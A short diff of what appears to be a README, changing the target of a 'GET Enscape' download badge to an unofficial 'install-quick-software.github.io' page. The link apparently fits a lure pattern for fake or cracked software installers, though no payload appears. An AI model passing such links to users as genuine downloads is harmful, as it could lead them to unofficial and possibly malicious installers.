@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/enscape">  
+<a href="https://install-quick-software.github.io/.github/enscape">  
 <img src="https://img.shields.io/badge/💻_GET_Enscape-orange?style=for-the-badge&logo=apple" alt="GET Enscape">  
 </a>  
 </div>
